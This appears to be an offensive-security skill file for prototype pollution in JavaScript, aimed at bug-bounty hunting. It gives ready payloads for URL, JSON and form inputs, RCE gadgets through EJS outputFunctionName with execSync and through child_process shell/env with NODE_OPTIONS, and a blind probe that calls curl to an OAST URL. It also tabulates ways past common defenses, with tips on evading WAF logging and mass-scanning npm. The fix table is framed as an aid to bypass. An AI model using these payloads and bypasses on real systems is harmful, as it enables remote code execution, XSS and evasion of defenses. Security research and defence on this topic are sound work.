---
name: prototype_pollution
category: vulnerabilities
description: Prototype pollution — client-side (→ DOM-XSS / clobbering) and server-side Node.js (→ RCE via option gadgets), detection with ppfuzz/ppscan/kleptonomicon, gadget enumeration, common sinks (lodash.merge, jQuery.extend, JSON.parse+Object.assign), fix patterns (Object.create(null), Object.freeze)
depends_on: []
---

# Prototype Pollution

Every JS object inherits from `Object.prototype`. Writing to `obj.__proto__.x` or `constructor.prototype.x` pollutes the prototype — every object in the runtime sees that property. Client-side: escalates to XSS/clobbering. Server-side (Node.js): escalates to RCE through option gadgets.

## Discovery Signals

| Signal | Where to Find | Why Vulnerable |
|---|---|---|
| `lodash.merge` / `_.merge` < 4.17.12 | `package.json`, JS bundles | Recursive merge without `__proto__` guard |
| `jQuery.extend(true, ...)` < 3.4.0 | JS bundles, CDN includes | Deep extend copies `__proto__` keys |
| `deep-extend` < 0.5.1, `hoek` < 4.2.1 | `package.json`, `yarn.lock` | No prototype-key filtering in recursive copy |
| `minimist` < 1.2.6 | CLI tools, `package-lock.json` | Dot-notation parsing creates nested `__proto__` |
| `JSON5.parse` < 2.2.2 (CVE-2022-46175) | `package.json` deps | JSON5 parser copies `__proto__` keys during parse |
| Mermaid `%%{init: {JSON}}%%` directive | GitLab/GitHub markdown, wikis | Config merge into library state without key filter |
| Express `qs` parser with `depth > 1` | `req.query` with brackets | `?a[__proto__][x]=1` creates polluted nested object |
| `@firebase/util` `deepCopy`/`deepExtend` | Firebase SDK apps | Recursive copy with no key blocklist, 1.5M weekly downloads |
| Custom `for (k in src) dst[k] = src[k]` | Codebase grep | Any hand-rolled deep copy without hasOwnProperty guard |
| WebSocket/data-channel JSON merge | Real-time apps (Jitsi, chat) | Trusted-channel JSON merged via unsafe function |
| `console.table(data, properties)` | Node.js debugging endpoints | Internal formatting uses bracket access on user keys |
| `Object.assign({}, JSON.parse(input))` | API handlers | `__proto__` key propagates through assign |

## When to Use

- Target uses JSON input where deep merging / recursive assignment occurs
- Query string parser creates nested objects (`?a[b][c]=1`)
- Node.js backend with user-controlled JSON body parsing
- Client-side app using `$.extend(true, ...)` or `_.merge(state, userData)`
- Any markdown/diagram renderer with config directives (Mermaid, PlantUML)
- Real-time apps merging WebSocket/data-channel JSON messages into state
- Applications using `JSON5.parse`, `yaml.load`, or custom config parsers

## Attack Surface

### Client-side (CSPP)
1. **DOM XSS**: library reads `obj.innerHTML`/`obj.srcdoc` as config default → polluted default fires
2. **DOM Clobbering**: `<form id="x">` creates `window.x` polluting lookup chains
3. **Security flag bypass**: `{isAdmin: true}` polluted → every object "is admin"

Classic CSPP → DOM XSS chain:
```javascript
// Step 1: Pollute via URL
//   https://target.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
// Step 2: A widget later does:
function render(widget) {
  el.innerHTML = widget.innerHTML || defaultHTML;  // pollution hits
}
render({});   // widget.innerHTML falsy — pollution kicks in → XSS
```

### Server-side (SSPP)
Polluting `Object.prototype` affects every object in the Node.js process. Libraries reading `options.X ?? default` get polluted overrides. Chains to RCE via `child_process`, template engines, or `require` path manipulation.

## Framework-Specific Entry Points

| Framework/Library | Vulnerable Function | Version | Notes |
|---|---|---|---|
| EJS | `outputFunctionName` option injection | <= 3.1.6 (CVE-2022-29078) | `res.render('page', req.query)` → RCE via `settings[view options]` bypass |
| Vue.js | `template` property compile | All (prototype lookup) | Pollute `Object.prototype.template` → uninitialized component renders attacker HTML |
| Handlebars | `helpers`/`partials` resolution | < 4.7.7 (CVE-2019-19919) | Polluted helper names execute attacker code during compile |
| Pug/Jade | `self`/`debug` options | Legacy Jade, Pug < 3.0.1 | Option injection via prototype → template code injection |
| Express | `view engine` + `views` path | All (option inheritance) | Redirect template resolution to attacker-controlled directory |
| Sequelize | `dialectOptions` merge | < 6.x (varies) | DB connection options polluted → SSRF or credential injection |
| Mongoose | `toObject`/`toJSON` options | Schema merge paths | Polluted options leak internal fields or change serialization |
| dotenv | `processEnv` option | When merged with user input | Polluted env vars affect downstream `process.env` reads |
| Winston/Bunyan | transport options merge | Config merge paths | Polluted log destination → exfil to attacker endpoint |

## Server-Side RCE Gadgets

### Gadget 1: `child_process` shell/env
```json
{"__proto__":{"shell":"/bin/sh","env":{"NODE_OPTIONS":"--require /tmp/evil.js"}}}
```
Any `exec()`/`spawn()` call reads polluted `shell` and `env` from prototype.

### Gadget 2: EJS `outputFunctionName` (CVE-2022-29078)
```
GET /page?settings[view%20options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');//
```
Express passes `req.query` → `res.render()` → EJS `shallowCopy` bypasses the allowlist via `data.settings['view options']`. The `outputFunctionName` is concatenated unescaped into compiled template source.

### Gadget 3: Vue.js `template` (PP→Stored XSS)
Pollute `Object.prototype.template` with `<iframe srcdoc="<script src=//evil>">`. Any Vue component without explicit template compiles the polluted value on user interaction (click search bar, navigate). Chain with CSP bypass via same-origin artifacts (GitLab CI jobs, GitHub Gists) — `script-src 'self'` trusts user-uploaded artifacts.

### Gadget 4: Node.js permission/policy bypass
```javascript
process.mainModule.__proto__.require("child_process")  // bypasses --experimental-policy
Module.prototype.require("os")                          // same unwrapped require
Object.getPrototypeOf(process.mainModule).require("fs") // Reflect variant
```
Policy interceptor installed on instance, not prototype. Any prototype-chain access reaches the unwrapped `require`.

### Gadget 5: Express view engine redirect
```json
{"__proto__":{"view engine":"ejs","views":"/tmp/attacker-views"}}
```
Next `res.render()` loads templates from attacker-controlled directory.

## Client-Side XSS Gadgets

| Gadget Target | Property to Pollute | Payload | Impact |
|---|---|---|---|
| jQuery AJAX default URL | `url` | `?__proto__[url]=//evil/xss.html` | AJAX loads attacker HTML → `.html()` sink |
| DOMPurify config | `ALLOW_UNKNOWN_PROTOCOLS` | `?__proto__[ALLOW_UNKNOWN_PROTOCOLS]=true` | Sanitizer bypass → XSS |
| DOMPurify allowed tags | `ALLOWED_TAGS`, `ALLOWED_ATTR` | Pollute with permissive lists | Sanitizer allows `<script>`/`onerror` |
| Vue component template | `template` | `<img src=x onerror=alert(1)>` | Every uninitialized component renders payload |
| Lodash `_.template` | `variable` | Code injection via template compilation | Arbitrary JS in template context |
| Analytics SDK config | `trackingUrl`, `src`, `endpoint` | `//evil/collect` | Exfil session data to attacker |
| Chart/diagram library | config option → HTML sink | Library-specific (e.g., Mermaid theme) | XSS via rendered SVG/HTML output |
| React dangerouslySetInnerHTML | `__html` | Pollute default prop → rendered as HTML | XSS in components using spread props |

## Defense-Bypass Pairs

| Defense | Bypass Technique | Example |
|---|---|---|
| `Object.freeze(Object.prototype)` | Pollute before freeze; target sub-prototypes (`Array.prototype`, `String.prototype`) | Pollution in inline `<script>` before boot script runs freeze |
| `hasOwnProperty` check in merge | `constructor.prototype` path skips `__proto__` check entirely | `{"constructor":{"prototype":{"x":1}}}` |
| Blocklist `__proto__` key in JSON parser | `constructor.prototype`; nested `__proto__` in sub-objects | `{"a":{"__proto__":{"x":1}}}` when only top-level filtered |
| Schema validation (`ajv`, `joi`) | Pollution happens pre-validation when `Object.assign` merges before check | Input merged into defaults THEN validated — too late |
| `Map` for dynamic keys | Static config objects still use plain `{}` | Pollute the plain-object config that Map results merge into |
| Node.js `--disable-proto=delete` | `Object.getPrototypeOf(obj).x = 1`; `Reflect.getPrototypeOf()`; `constructor.prototype` | Flag only blocks literal `__proto__` property, not chain access |
| Sanitization library (`dset` safe mode) | Pollute via query string parser before sanitized merge runs | `qs.parse` creates pre-polluted object, handed to safe merge |
| Recursive key blocklist | Unicode normalization tricks; property name with zero-width chars | `\u{5f}\u{5f}proto\u{5f}\u{5f}` may bypass string comparison |

## Detection

### Client-side (DevTools console)
```javascript
// 1. Baseline sanity
Object.prototype.polluted = "yes";
console.log({}.polluted);     // "yes" → confirms prototype chain works
delete Object.prototype.polluted;

// 2. Test query string source
location.href = location.href + "?__proto__[test1]=hitit";
setTimeout(() => { console.log("polluted?", {}.test1); delete Object.prototype.test1; }, 500);

// 3. Test hash fragment (stealthier — no server log)
location.hash = "__proto__[test2]=hitit";
setTimeout(() => { console.log("polluted?", {}.test2); delete Object.prototype.test2; }, 500);

// 4. Test constructor path (bypass for __proto__ filters)
location.href = location.href + "?constructor[prototype][test3]=hitit";
setTimeout(() => { console.log("polluted?", {}.test3); delete Object.prototype.test3; }, 500);
```

### Server-side
Send to every endpoint accepting nested JSON:
```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
{"__proto__.polluted": "yes"}
```
Then hit a reflection endpoint (`GET /api/me`, `/api/config`, `/api/features`) and check for `polluted` on unrelated objects.

**Blind detection techniques**:
- DoS probe: `{"__proto__":{"toString":null}}` — crash on next string conversion confirms pollution
- OAST: `{"__proto__":{"shell":"node","env":{"NODE_OPTIONS":"--require=<(curl OAST_URL)"}}}` → wait for callback
- Timing: pollute a property that triggers expensive computation in a known library path

## Payloads

### URL / Query String
```
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
?__proto__.polluted=yes
?a[__proto__][polluted]=yes
```

### JSON
```json
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
{"__proto__":{"toString":{"constructor":{"prototype":{"polluted":"yes"}}}}}
```

### Form-encoded (qs-style)
```
__proto__[polluted]=yes
constructor[prototype][polluted]=yes
```

## Chain Patterns

| Chain | Steps | Impact |
|---|---|---|
| PP → `child_process` shell | Pollute `shell`/`env` → any `exec()`/`spawn()` inherits | **RCE** (Critical) |
| PP → EJS `outputFunctionName` | Pollute via `settings[view options]` → template compile injects code | **RCE** (Critical) |
| PP → Express `views` redirect | Pollute `views` path → template loaded from attacker directory | **RCE** (Critical) |
| PP → Node.js policy bypass | `__proto__.require()` bypasses instance-level interceptor | **Sandbox escape** (Critical) |
| PP → Vue `template` gadget | Pollute `template` → user interaction triggers Vue compile | **Stored XSS** (High) |
| PP → DOMPurify config | Pollute `ALLOWED_TAGS`/`ALLOW_UNKNOWN_PROTOCOLS` → sanitizer disabled | **XSS** (High) |
| PP → `isAdmin` flag | Pollute auth check property → every new object inherits truthy | **Auth bypass** (High) |
| PP → ORM options | Pollute Sequelize `dialectOptions` → SSRF/cred injection via DB connect | **SSRF** (High) |
| PP → `toString` null | Pollute `toString` to non-function → TypeError on string conversion | **DoS** (Medium) |
| PP → logging transport | Pollute Winston/Bunyan destination → exfil logs to attacker | **Data exfil** (Medium) |

## Corpus-Extracted Techniques

Real techniques from disclosed bounty reports:

| Technique | Source Context | Key Insight |
|---|---|---|
| PP via Mermaid `%%{init}%%` directive → page-wide DoS | GitLab (#1106238, $3k) | User-controlled JSON in markdown diagram directive merged into library config without key filter |
| PP → Vue.js `template` gadget → stored XSS | GitLab (#1280002, $3k) | Polluted `Object.prototype.template` compiles when ANY Vue component mounts without explicit template |
| CSP bypass via CI artifacts as payload host | GitLab (#1280002) | Job artifacts served from same origin (`gitlab.com`) = `script-src 'self'` trusted; use `<iframe srcdoc>` for script context |
| PP in `@firebase/util` `deepExtend` | Firebase SDK (#1001218) | Shared utility package — one PP sink in util affects every Firebase consumer app |
| `console.table` prototype writes | Node.js core (#1431042) | Non-security stdlib APIs accumulate unsafe bracket access; `console.*` methods rarely audited |
| `__proto__.require()` bypasses Node.js policy | Node.js (#1877919) | Instance-level interceptor doesn't shadow prototype method; `Object.getPrototypeOf(x).require()` works |
| Sawyer `to_s`/`bytesize` override → Redis RESP injection | GitLab GitHub Import (#1679624, $33k) | JSON property-name maps to Ruby method override via recursive `attr_accessor` — a PP analog in Ruby |
| WebSocket bridge message spoofing + PP | Jitsi (#2095061) | Trusted-channel messages merged via unsafe function → PP affects all conference participants |
| JSON5 parser PP (CVE-2022-46175) | JSON5 library | JSON-superset parsers often implement custom object creation that copies `__proto__` |
| Nested object in `deepCopy` utility | Firebase, custom SDKs | Any `for (key in src) dst[key] = src[key]` without `key !== '__proto__'` guard is PP-vulnerable |

## Methodology

### Phase 1: Source Hunt
```bash
# Merge/extend patterns in JS bundles or server code
grep -rhoE '(_\.merge|\.extend\s*\(\s*true|Object\.assign|deepCopy|deepExtend)\(' js_dump/*.js | sort -u
# Direct __proto__ writes
grep -rhoE '__proto__\s*[\[\.]' js_dump/*.js
# qs.parse with depth
grep -rhoE 'qs\.parse\([^)]+\)' js_dump/*.js
# Hand-rolled deep copy (highest-yield pattern from corpus)
grep -rn 'for.*in.*src.*dst\[' js_dump/*.js
```

### Phase 2: Input Hunt
- Query strings via Express `qs` → objects with `__proto__` keys
- JSON bodies → `JSON.parse` + merge/assign
- Form-encoded with brackets → qs-style parsing
- WebSocket/data-channel messages with nested JSON
- Mermaid/diagram directives with `%%{init: {JSON}}%%`
- Config/theme endpoints accepting arbitrary JSON
- Clipboard paste handlers (custom MIME types merged into config)

### Phase 3: Pollution Test
Probe for persistence across requests:
```
POST /api/profile  {"__proto__":{"isAdmin":true}}
GET  /api/me       → check if "isAdmin":true appears on unrelated user object
```
Blind: `child_process` pollution + curl OAST. DoS: `{"__proto__":{"toString":null}}`.

### Phase 4: Gadget Hunt

**Client-side systematic approach**:
1. List every JS library loaded (check network tab, `document.scripts`, bundled deps)
2. For each library, search source for `options.<X>` or `cfg.<X>` where X affects a sink (`innerHTML`, `template`, `src`, `url`, `eval`)
3. Test pollution of that property name: `?__proto__[propertyName]=<payload>`
4. Known gadget DB: `github.com/BlackFan/client-side-prototype-pollution` — check target's libraries against it
5. Priority targets: Vue (`template`), DOMPurify (`ALLOWED_TAGS`), jQuery (`.html()` defaults), analytics SDKs

**Server-side systematic approach**:
1. `child_process`: pollute `shell`, `env`, `NODE_OPTIONS`, `cwd`
2. Template engines: `outputFunctionName` (EJS), `template` (Vue SSR), `helpers`/`partials` (Handlebars), `self`/`debug` (Pug)
3. Express options: `view engine`, `views`, `trust proxy`, `etag`
4. ORM/DB: `dialectOptions` (Sequelize), `authSource` (Mongoose), connection string components
5. Logging: transport destination, format string, level (pollute to `debug` for info disclosure)

## Common Sinks

| Sink | Pattern | Risk Level |
|---|---|---|
| `lodash.merge` / `_.merge` | `_.merge(dest, userInput)` | Critical (< 4.17.12) |
| `jQuery.extend` deep | `$.extend(true, dest, userInput)` | Critical (< 3.4.0) |
| Dynamic bracket assign | `dest[key1][key2] = value` (attacker keys) | High |
| `qs.parse` with depth | `qs.parse(url, { depth: 10 })` | High (depth > 1) |
| `Object.assign` + `JSON.parse` | `Object.assign({}, JSON.parse(input))` | High |
| Hand-rolled deep copy | `for (let k in s) d[k]=s[k]` | High (no guard) |
| `JSON5.parse` | `JSON5.parse(userInput)` | High (< 2.2.2) |
| Spread with computed keys | `{...obj, [userKey]: userVal}` (indirect) | Medium |
| `Object.defineProperties` | `Object.defineProperties(target, userObj)` | Medium |
| `_.defaultsDeep` | `_.defaultsDeep(config, userInput)` | High (< 4.17.12) |

## Non-Obvious PP Vectors

These are PP-class bugs that don't use the literal `__proto__` keyword:

| Vector | Mechanism | Detection |
|---|---|---|
| Ruby Sawyer `attr_accessor` override | JSON property names become method overrides on Ruby objects; `to_s`/`bytesize` divergence → protocol injection | Audit any library using recursive `attr_accessor` from untrusted JSON |
| Python `__class__` attribute injection | `merge(obj, {"__class__":{"__init__":...}})` in some Python ORMs | Grep for `setattr(obj, key, value)` with user-controlled keys |
| `Object.defineProperty` descriptor merge | `{"__proto__":{"polluted":{"configurable":true,"value":"yes"}}}` | Some frameworks interpret nested objects as property descriptors |
| Clipboard custom MIME type merge | `text/x-gfm-html` or app-specific MIME → merged into config via `innerHTML` sink | Audit every `paste`/`drop` handler for unsanitized MIME data |
| GraphQL resolver default merging | Resolver `args` merged into query builder without key filtering | Test `__proto__` in GraphQL variables/arguments |

## Tooling

| Tool | Purpose | Command / URL |
|---|---|---|
| ppfuzz | Client-side PP scanner (fast, 80% coverage) | `ppfuzz -l urls.txt` |
| ppmap | Automated gadget detection for known libraries | `github.com/nicolo-ribaudo/ppmap` |
| Semgrep PP rules | Static analysis on source/bundles | `semgrep --config "p/javascript.prototype-pollution" .` |
| kleptonomicon | Client-side gadget database | `github.com/BlackFan/client-side-prototype-pollution` |
| Burp PP scanner | Active scan insertion point for `__proto__` | Built-in with BApp store extensions |
| `server-side-prototype-pollution` | Burp extension for SSPP detection | BApp store — tests blind PP via status code/timing diff |

## Fix Patterns (Defensive Context)

Understanding defenses helps find bypasses:

| Fix | How It Works | Weakness |
|---|---|---|
| `Object.create(null)` for config objects | Prototype-less object — no chain to pollute | Only protects objects created this way; existing `{}` still vulnerable |
| `Object.freeze(Object.prototype)` at boot | Prevents writes to frozen prototype | Must run before ANY user code; sub-prototypes still mutable |
| Schema validation with `additionalProperties: false` | Rejects unknown keys including `__proto__` | Only works if validation runs BEFORE merge (order matters) |
| Key blocklist in JSON parser | Strips `__proto__`/`constructor`/`prototype` keys | `constructor.prototype` path, nested sub-objects, encoding tricks |
| `Map` instead of objects for dynamic keys | Map has no prototype chain pollution risk | Doesn't protect static config objects alongside the Map |
| `--disable-proto=delete` Node.js flag | Removes `__proto__` accessor from all objects | `Object.getPrototypeOf()`, `Reflect.getPrototypeOf()`, `constructor.prototype` still work |
| `deepmerge` with `isMergeableObject` guard | Only merges plain objects, skips prototype keys | Depends on correct guard implementation; custom guards may miss edge cases |

## Pro Tips

1. Run ppfuzz first — finds 80% of CSPP in minutes, highest ROI first step
2. Reflection endpoints are goldmines: `/api/config`, `/api/me`, `/api/features` — spray pollution then read back
3. Always test BOTH `__proto__` AND `constructor.prototype` — many filters block only one path
4. Hash fragment pollution (`#__proto__[x]=1`) is stealthier than query params — bypasses server-side WAF logging entirely
5. Pollution alone is Low severity; pollution + gadget is High/Critical — ALWAYS hunt the gadget chain before reporting
6. For Vue/React/Angular apps: pollute `template`/`dangerouslySetInnerHTML`/`innerHTML` then trigger a component mount without explicit template
7. Check `package-lock.json` for transitive deps — the app may not import lodash directly but a dependency's dependency does
8. CSP bypass for PP→XSS: look for same-origin user-controllable files (CI artifacts, raw blobs, gists, paste bins) as `script-src 'self'` payload hosts
9. Target utility packages in large SDKs (Firebase, AWS SDK, Stripe) — shared `deepCopy` functions affect every consumer
10. For real-time apps (Jitsi, Slack-like): check if WebSocket messages are merged via unsafe function — message spoofing + PP = remote XSS on all participants
11. **Recursive merge/extend/copy is the #1 source**: grep for `function.*deep|merge|extend|assign|clone|defaults|copy` across all deps. Any function that walks `for (key in src)` without filtering `__proto__`/`constructor` is vulnerable. Quick black-box test: `require('pkg'); let o = {}; pkg.merge(o, JSON.parse('{"__proto__":{"polluted":1}}')); console.log({}.polluted)` -- if `1`, file it
12. **Audit "non-security" stdlib APIs**: the most-audited APIs (auth, crypto, parsing) get fixed fast; the leakiest PP surfaces hide in logging, formatting, debugging, and utility functions that nobody threat-models. `console.table`, `util.inspect` options, `Buffer` constructors with object args -- search for bracket access on user-controlled keys in ANY stdlib path
13. **Class-then-corpus sweep**: when you find ONE vulnerable code shape (e.g., recursive `obj[key] = src[key]` without key filtering), build a regex/semgrep rule for that shape and scan the entire npm registry (or target's `node_modules`). One code shape match across 50 packages = 50 reports. Tools: `npm-grep`, `codesearch.debian.net`, GitHub code search
14. **Sink-pattern enumeration**: for PP specifically, the stable code signatures are: (a) `(target, path, value)` deep-write APIs, (b) dot-notation/bracket-notation path parsers (MongoDB-style `a.b.c` to nested object), (c) any package with "merge"/"extend"/"clone"/"set"/"defaults" in its npm name/description. Enumerate, test each with the 3-line PoC from tip 11, file each hit separately

## Severity Escalation Guide

| PP Primitive Alone | With Gadget | Typical Bounty Range |
|---|---|---|
| Client-side PP confirmed, no gadget | N/A | Low / $150-500 |
| Client-side PP + DOM XSS gadget | `template`, `innerHTML`, DOMPurify bypass | Medium-High / $500-5,000 |
| Client-side PP + stored XSS + CSP bypass | Vue template + same-origin artifact host | High / $3,000-10,000 |
| Server-side PP confirmed, no gadget | N/A | Low-Medium / $200-1,000 |
| Server-side PP + `child_process` RCE | `shell`/`env`/`NODE_OPTIONS` | Critical / $5,000-50,000 |
| Server-side PP + template engine RCE | EJS `outputFunctionName`, Pug options | Critical / $5,000-33,000 |
| Server-side PP + auth bypass | `isAdmin`, `role`, ACL properties | High / $2,000-15,000 |

## Cross-References

- `js_analysis.md` — find merge/extend usage in bundle
- `js_deobfuscation.md` — de-minify before hunting gadgets
- `insecure_deserialization.md` — Node.js `JSON.parse` + Object.assign overlap
- `xss.md` — client-side pollution → DOM XSS chain
- `rce.md` — server-side pollution + gadget → RCE chain
